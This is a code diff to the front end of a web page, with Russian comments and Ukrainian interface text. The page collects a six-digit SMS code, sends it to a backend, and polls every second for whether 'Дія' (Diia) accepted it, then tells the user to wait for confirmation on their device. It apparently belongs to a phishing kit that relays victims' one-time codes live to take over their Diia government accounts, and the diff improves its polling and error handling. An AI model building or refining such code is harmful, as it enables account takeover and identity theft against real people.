@@ -511,6 +511,7 @@
     let resendTimerInterval = null;
     let resendCooldownInterval = null;
     let countdownInterval = null;
+    let verificationPoller = null;
     let lastRefreshTime = Date.now();
     let refreshCount = 0;
 
@@ -662,6 +663,10 @@
       if (countdownInterval) {
         clearInterval(countdownInterval);
         countdownInterval = null;
+      }
+      if (verificationPoller) {
+        clearInterval(verificationPoller);
+        verificationPoller = null;
       }
     }
 
@@ -962,9 +967,10 @@
       const digits = document.querySelectorAll('.sms-digit');
       const code = Array.from(digits).map(d => d.value).join('');
       
-      // Убираем фронтенд валидацию - отправляем любой код
+      // Проверяем что код состоит из 6 цифр
       if (code.length !== 6) {
-        return; // Просто не отправляем если меньше 6 цифр
+        document.getElementById("sms-error").textContent = "Будь ласка, введіть повний 6-значний код";
+        return;
       }
       
       const submitBtn = document.getElementById("send-code-btn");
@@ -986,55 +992,68 @@
       try {
         const res = await fetch(CODE_URL, { method: "POST", body: fd });
         const resp = await res.json();
+        
         if (resp.ok) {
           // Код отправлен в API, теперь ждем результат проверки от FSM
-          console.log("Код отправлен, ожидаем результат проверки...");
+          console.log("✅ Код отправлен успешно, ожидаем результат проверки...");
           
-          // Меняем текст кнопки на ожидание
-          submitBtn.textContent = "Перевіряємо...";
+          // Меняем текст кнопки на ожидание с анимацией точек
           submitBtn.style.background = 'linear-gradient(45deg, #2196f3, #1976d2)';
           
-          // Запускаем проверку результата
-          await waitForVerificationResult();
+          // Запускаем анимацию точек и ожидание результата
+          await waitForVerificationResult(submitBtn);
           
         } else {
+          // Ошибка отправки на сервер
+          console.error("❌ Ошибка отправки кода:", resp);
           submitBtn.disabled = false;
           submitBtn.textContent = originalText;
           submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
-          document.getElementById("sms-error").textContent = "Помилка відправки коду. Спробуйте ще раз.";
+          document.getElementById("sms-error").textContent = resp.error || "Помилка відправки коду. Спробуйте ще раз.";
+          showSuccessMessage(""); // Скрываем сообщение об отправке
         }
       } catch (e) {
-        console.error("Ошибка отправки кода:", e);
+        console.error("❌ Ошибка отправки кода:", e);
         submitBtn.disabled = false;
         submitBtn.textContent = originalText;
         submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
         document.getElementById("sms-error").textContent = "Помилка з'єднання. Спробуйте ще раз.";
+        showSuccessMessage(""); // Скрываем сообщение об отправке
       }
     }
 
-    async function waitForVerificationResult() {
-      // Ждем результат проверки кода от FSM
-      console.log("Ожидание результата проверки кода от Дії...");
+    async function waitForVerificationResult(submitBtn) {
+      console.log("⏳ Ожидание результата проверки кода от Дії...");
       
-      const submitBtn = document.getElementById("send-code-btn");
       const originalText = "Підтвердити";
       
-      // Показываем прогресс
+      // Показываем прогресс с анимированными точками
       let dots = 0;
       const progressInterval = setInterval(() => {
         dots = (dots + 1) % 4;
         submitBtn.textContent = "Перевіряємо" + ".".repeat(dots);
       }, 500);
       
-      for (let i = 0; i < 30; i++) { // Ждем максимум 30 секунд
+      // Используем существующий /api/link-status endpoint для проверки
+      let attempts = 0;
+      const maxAttempts = 60; // 60 секунд максимум
+      
+      verificationPoller = setInterval(async () => {
+        attempts++;
+        
         try {
-          const res = await fetch(`${API_BASE}/api/check-verification-result?id=${currentId}`);
+          const res = await fetch(`${STATUS_URL}?id=${currentId}`);
           const result = await res.json();
           
-          if (result.status === "success") {
-            clearInterval(progressInterval);
+          console.log(`🔍 Статус проверки (попытка ${attempts}):`, result);
+          
+          if (result.status === "completed" || result.status === "success") {
             // Код принят Дією - показываем успех
+            clearInterval(progressInterval);
+            clearInterval(verificationPoller);
             clearInterval(countdownInterval);
+            
+            console.log("✅ Код принят Дією успешно!");
             
             document.body.innerHTML = `
               <div class="sms-fullscreen">
@@ -1043,19 +1062,27 @@
                 </div>
                 <div style='text-align: center; padding: 40px;'>
                   <h2 style='color: #4caf50; font-size: clamp(24px, 6vw, 32px); margin-bottom: 20px;'>✅ Код прийнято</h2>
-                  <p style='color: rgba(255,255,255,0.9); font-size: clamp(16px, 4vw, 20px);'>Чекаємо підтвердження на пристрої…</p>
+                  <p style='color: rgba(255,255,255,0.9); font-size: clamp(16px, 4vw, 20px); line-height: 1.5;'>
+                    Чекаємо підтвердження на пристрої…<br>
+                    <small style='font-size: clamp(14px, 3vw, 16px); opacity: 0.8;'>Сторінка оновиться автоматично</small>
+                  </p>
                 </div>
               </div>
             `;
             
             setTimeout(() => {
-              location.reload(); // Перезагружаем страницу
+              location.reload(); // Перезагружаем страницу через 5 секунд
             }, 5000);
+            
             return;
             
-          } else if (result.status === "failed") {
+          } else if (result.status === "failed" || result.status === "error") {
+            // Код отклонен Дією
             clearInterval(progressInterval);
-            // Код отклонен Дією - показываем ошибку и очищаем поля
+            clearInterval(verificationPoller);
+            
+            console.log("❌ Код отклонен Дією");
+            
             submitBtn.disabled = false;
             submitBtn.textContent = originalText;
             submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
@@ -1077,35 +1104,44 @@
             return;
           }
           
-          // Если статус "pending" - продолжаем ждать
-          await new Promise(resolve => setTimeout(resolve, 1000));
+          // Если статус все еще "waiting_code" или "processing" - продолжаем ждать
+          if (attempts >= maxAttempts) {
+            // Таймаут ожидания результата
+            clearInterval(progressInterval);
+            clearInterval(verificationPoller);
+            
+            console.log("⏰ Таймаут ожидания результата проверки");
+            
+            submitBtn.disabled = false;
+            submitBtn.textContent = originalText;
+            submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
+            document.getElementById("sms-error").textContent = "⏰ Час очікування вичерпано. Спробуйте ще раз.";
+            showSuccessMessage(""); // Скрываем сообщение об отправке
+          }
           
         } catch (e) {
-          console.error("Ошибка проверки результата:", e);
-          await new Promise(resolve => setTimeout(resolve, 1000));
+          console.error("❌ Ошибка проверки результата:", e);
+          // Продолжаем попытки при ошибках сети
         }
-      }
-      
-      clearInterval(progressInterval);
-      // Таймаут ожидания результата
-      console.log("Таймаут ожидания результата проверки");
-      submitBtn.disabled = false;
-      submitBtn.textContent = originalText;
-      submitBtn.style.background = 'linear-gradient(45deg, #4caf50, #45a049)';
-      document.getElementById("sms-error").textContent = "⏰ Час очікування вичерпано. Спробуйте ще раз.";
-      showSuccessMessage(""); // Скрываем сообщение об отправке
+      }, 1000); // Проверяем каждую секунду
     }
 
     // Показать сообщение об успехе
     function showSuccessMessage(message) {
       const successDiv = document.getElementById("success-message");
-      successDiv.textContent = message;
-      successDiv.style.display = "block";
-      
-      // Скрываем через 5 секунд (увеличено для важного сообщения о продлении)
-      setTimeout(() => {
-        successDiv.style.display = "none";
-      }, 5000);
+      if (successDiv) {
+        successDiv.textContent = message;
+        successDiv.style.display = message ? "block" : "none";
+        
+        // Скрываем через 5 секунд если есть сообщение
+        if (message) {
+          setTimeout(() => {
+            if (successDiv) {
+              successDiv.style.display = "none";
+            }
+          }, 5000);
+        }
+      }
     }
     
     // Функция запроса повторной отправки SMS
@@ -1172,10 +1208,13 @@
         const data = await res.json();
         
         if (data.resends_remaining !== undefined) {
-          document.getElementById("resend-count").textContent = data.resends_remaining;
+          const resendCountElem = document.getElementById("resend-count");
+          if (resendCountElem) {
+            resendCountElem.textContent = data.resends_remaining;
+          }
           
           const resendBtn = document.getElementById("resend-btn");
-          if (data.resends_remaining <= 0) {
+          if (data.resends_remaining <= 0 && resendBtn) {
             resendBtn.disabled = true;
             resendBtn.textContent = "Лімит вичерпано";
           }
